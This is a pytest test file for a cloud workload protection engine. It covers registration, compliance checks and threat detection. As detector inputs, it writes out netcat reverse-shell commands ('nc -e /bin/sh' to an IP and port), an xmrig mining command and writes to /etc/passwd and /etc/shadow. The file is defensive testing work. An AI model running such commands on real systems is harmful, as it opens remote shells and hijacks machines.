"""Tests for CWPPEngine — Cloud Workload Protection Platform."""
from __future__ import annotations

import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, "suite-core")

from core.cwpp_engine import CWPPEngine, WORKLOAD_TYPES, COMPLIANCE_FRAMEWORKS


# ============================================================================
# Fixtures
# ============================================================================


@pytest.fixture
def temp_db():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name
    yield db_path
    Path(db_path).unlink(missing_ok=True)


@pytest.fixture
def engine(temp_db):
    return CWPPEngine(db_path=temp_db)


@pytest.fixture
def registered_container(engine):
    """A registered container workload."""
    return engine.register_workload(
        workload_id="wl-test-001",
        workload_type="container",
        name="test-nginx",
        metadata={"image": "nginx:1.25", "namespace": "default"},
    )


@pytest.fixture
def registered_pod(engine):
    """A registered kubernetes_pod workload."""
    return engine.register_workload(
        workload_id="wl-pod-001",
        workload_type="kubernetes_pod",
        name="test-pod",
        metadata={"image": "myapp:2.0", "namespace": "prod"},
    )


# ============================================================================
# Workload registration
# ============================================================================


def test_register_workload_returns_dict(engine):
    result = engine.register_workload(
        workload_id="wl-001",
        workload_type="container",
        name="my-container",
    )
    assert isinstance(result, dict)
    assert result["workload_id"] == "wl-001"


def test_register_workload_has_required_fields(engine):
    result = engine.register_workload(
        workload_id="wl-002",
        workload_type="vm",
        name="my-vm",
    )
    assert "workload_id" in result
    assert "workload_type" in result
    assert "name" in result
    assert "state" in result
    assert "registered_at" in result
    assert result["state"] == "active"


def test_register_invalid_workload_type_raises_value_error(engine):
    with pytest.raises(ValueError, match="Invalid workload_type"):
        engine.register_workload(
            workload_id="wl-bad",
            workload_type="invalid_type",
            name="bad-workload",
        )


def test_register_all_valid_workload_types(engine):
    for i, wtype in enumerate(WORKLOAD_TYPES):
        result = engine.register_workload(
            workload_id=f"wl-type-{i}",
            workload_type=wtype,
            name=f"workload-{wtype}",
        )
        assert result["workload_type"] == wtype


# ============================================================================
# Deregister
# ============================================================================


def test_deregister_workload_returns_true(engine, registered_container):
    result = engine.deregister_workload("wl-test-001")
    assert result is True


def test_deregister_unknown_workload_returns_false(engine):
    result = engine.deregister_workload("nonexistent-id")
    assert result is False


# ============================================================================
# List and get
# ============================================================================


def test_list_workloads_returns_list(engine, registered_container):
    result = engine.list_workloads()
    assert isinstance(result, list)
    assert len(result) >= 1


def test_get_workload_returns_registered(engine, registered_container):
    result = engine.get_workload("wl-test-001")
    assert result is not None
    assert result["workload_id"] == "wl-test-001"
    assert result["name"] == "test-nginx"


def test_get_workload_unknown_returns_none(engine):
    result = engine.get_workload("does-not-exist")
    assert result is None


def test_workload_type_filter_in_list_workloads(engine, registered_container, registered_pod):
    containers = engine.list_workloads(workload_type="container")
    pods = engine.list_workloads(workload_type="kubernetes_pod")
    container_ids = [w["workload_id"] for w in containers]
    pod_ids = [w["workload_id"] for w in pods]
    assert "wl-test-001" in container_ids
    assert "wl-pod-001" in pod_ids
    assert "wl-pod-001" not in container_ids
    assert "wl-test-001" not in pod_ids


def test_multiple_workloads_registered_independently(engine):
    engine.register_workload("wl-a", "container", "alpha")
    engine.register_workload("wl-b", "vm", "beta")
    engine.register_workload("wl-c", "lambda", "gamma")

    a = engine.get_workload("wl-a")
    b = engine.get_workload("wl-b")
    c = engine.get_workload("wl-c")

    assert a["workload_type"] == "container"
    assert b["workload_type"] == "vm"
    assert c["workload_type"] == "lambda"


# ============================================================================
# Threat detection
# ============================================================================


def test_detect_threats_xmrig_yields_crypto_mining(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "xmrig", "args": "--pool pool.minemonero.org", "user": "nobody"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert len(threats) >= 1
    categories = [t["category"] for t in threats]
    assert "crypto_mining" in categories


def test_detect_threats_passwd_write_yields_privilege_escalation(engine, registered_container):
    events = [
        {
            "event_type": "file_write",
            "details": {"path": "/etc/passwd", "user": "www-data"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert len(threats) >= 1
    categories = [t["category"] for t in threats]
    assert "privilege_escalation" in categories


def test_detect_threats_clean_events_returns_empty(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "nginx", "args": "-g daemon off", "user": "nginx"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert threats == []


def test_detect_threats_returns_list_of_dicts(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "nc", "args": "-e /bin/sh 10.0.0.1 4444", "user": "root"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert isinstance(threats, list)
    for t in threats:
        assert isinstance(t, dict)


def test_threat_has_severity_field(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "xmrig", "user": "nobody"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert len(threats) >= 1
    assert "severity" in threats[0]
    assert threats[0]["severity"] in ("low", "medium", "high", "critical")


def test_detect_reverse_shell_netcat(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "netcat", "args": "-e /bin/bash 192.168.1.100 1337", "user": "root"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    categories = [t["category"] for t in threats]
    assert "reverse_shell" in categories


def test_detect_threats_shadow_file_write(engine, registered_container):
    events = [
        {
            "event_type": "file_write",
            "details": {"path": "/etc/shadow", "user": "root"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    categories = [t["category"] for t in threats]
    assert "privilege_escalation" in categories


def test_threat_has_workload_id(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "xmrig", "user": "nobody"},
        }
    ]
    threats = engine.detect_threats("wl-test-001", events)
    assert len(threats) >= 1
    assert threats[0]["workload_id"] == "wl-test-001"


# ============================================================================
# Compliance
# ============================================================================


def test_check_compliance_returns_dict(engine, registered_container):
    result = engine.check_compliance("wl-test-001")
    assert isinstance(result, dict)


def test_compliance_score_is_float(engine, registered_container):
    result = engine.check_compliance("wl-test-001", framework="cis_docker")
    assert isinstance(result["score"], float)


def test_compliance_score_in_valid_range(engine, registered_container):
    result = engine.check_compliance("wl-test-001", framework="cis_docker")
    assert 0.0 <= result["score"] <= 100.0


def test_compliance_checks_list_is_non_empty(engine, registered_container):
    result = engine.check_compliance("wl-test-001", framework="cis_docker")
    assert isinstance(result["checks"], list)
    assert len(result["checks"]) > 0


def test_compliance_has_passed_failed_fields(engine, registered_container):
    result = engine.check_compliance("wl-test-001", framework="cis_docker")
    assert "passed" in result
    assert "failed" in result
    assert result["passed"] + result["failed"] == len(result["checks"])


def test_compliance_all_frameworks(engine, registered_container):
    for framework in COMPLIANCE_FRAMEWORKS:
        result = engine.check_compliance("wl-test-001", framework=framework)
        assert result["framework"] == framework
        assert 0.0 <= result["score"] <= 100.0


def test_compliance_unknown_framework_raises(engine, registered_container):
    with pytest.raises(ValueError):
        engine.check_compliance("wl-test-001", framework="made_up_framework")


# ============================================================================
# get_threat_events
# ============================================================================


def test_get_threat_events_after_detect(engine, registered_container):
    events = [
        {
            "event_type": "process_exec",
            "details": {"command": "xmrig", "user": "nobody"},
        }
    ]
    engine.detect_threats("wl-test-001", events)
    threats = engine.get_threat_events(workload_id="wl-test-001")
    assert isinstance(threats, list)
    assert len(threats) >= 1


def test_get_threat_events_returns_all_org_threats(engine, registered_container, registered_pod):
    engine.detect_threats("wl-test-001", [
        {"event_type": "process_exec", "details": {"command": "xmrig", "user": "root"}}
    ])
    engine.detect_threats("wl-pod-001", [
        {"event_type": "file_write", "details": {"path": "/etc/passwd"}}
    ])
    all_threats = engine.get_threat_events()
    assert len(all_threats) >= 2


# ============================================================================
# Protection summary
# ============================================================================


def test_get_protection_summary_numeric_fields(engine, registered_container):
    summary = engine.get_protection_summary()
    assert isinstance(summary["total_workloads"], int)
    assert isinstance(summary["active_workloads"], int)
    assert isinstance(summary["total_threats"], int)
    assert isinstance(summary["avg_compliance_score"], float)
    assert isinstance(summary["threats_by_category"], dict)


def test_protection_summary_counts_workloads(engine):
    engine.register_workload("wl-s1", "container", "s1")
    engine.register_workload("wl-s2", "vm", "s2")
    summary = engine.get_protection_summary()
    assert summary["total_workloads"] >= 2
    assert summary["active_workloads"] >= 2


def test_protection_summary_threats_by_category(engine, registered_container):
    engine.detect_threats("wl-test-001", [
        {"event_type": "process_exec", "details": {"command": "xmrig", "user": "nobody"}}
    ])
    summary = engine.get_protection_summary()
    assert "crypto_mining" in summary["threats_by_category"]
